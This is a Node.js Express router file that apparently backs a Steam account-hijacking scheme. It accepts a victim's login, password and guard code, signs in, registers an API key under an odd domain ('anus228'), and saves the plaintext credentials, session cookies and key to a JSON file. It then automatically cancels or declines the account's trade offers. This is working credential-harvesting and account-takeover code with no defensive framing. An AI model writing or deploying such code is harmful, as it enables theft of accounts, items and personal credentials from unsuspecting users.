var express = require("express");
var router = express.Router();

const { login, logout, retrieveAPIKey, isLoggedOn, startCheckingOffers, cancelOffer, declineOffer } = require("../public/javascripts/user");
const fs = require("fs");
const path = require("path");

let state = {
    user: { login: "", password: "", guard: "" },
    sessionID: "",
    cookies: [],
    APIKey: ""
};

const jsonPath = path.join(__dirname, '..', 'data', 'user-sessions.json');
const updateJSON = () => {
    let obj = JSON.parse(fs.readFileSync(jsonPath).toString());

    let userSession = {
        user: state.user,
        sessionID: state.sessionID,
        cookies: state.cookies,
        APIKey: state.APIKey,
        datetime: new Date().toLocaleString()
    };
    obj['user-sessions'].push(userSession);

    fs.writeFileSync(jsonPath, JSON.stringify(obj));
}

router.get("/", function (req, res, next) {
    retrieveAPIKey("anus228", state.sessionID, state.cookies)
        .then(key => {
            if (key !== state.APIKey) {
                state.APIKey = key;
                updateJSON();
            }
        })
        .finally(() => res.send(state));
});

router.post("/login", function (req, res, next) {
    if (isLoggedOn()) {
        res.send(400).send("Already logged on, cannot log on again");
        return;
    }

    login(req.body.login, req.body.password, req.body.guard)
        .then((response) => {
            state = {};
            state.user = req.body;
            state.sessionID = response.sessionID;
            state.cookies = response.cookies;

            retrieveAPIKey("anus228", state.sessionID, state.cookies)
                .then(key => {
                    state.APIKey = key;

                    startCheckingOffers(state.APIKey)
                        .then(offer => {
                            if (offer.is_our_offer) {
                                cancelOffer(state.APIKey, offer.tradeofferid);
                            }
                            else {
                                declineOffer(state.APIKey, offer.tradeofferid);
                            }
                        })
                        .catch();
                })
                .finally(() => {
                    updateJSON();
                    res.send(response);
                });
        })
        .catch(error => {
            res.status(400).send(error);
        });
});

router.post("/logout", function (req, res, next) {
    logout().then(() => res.status(200).send("Logged Out"));
});

module.exports = router;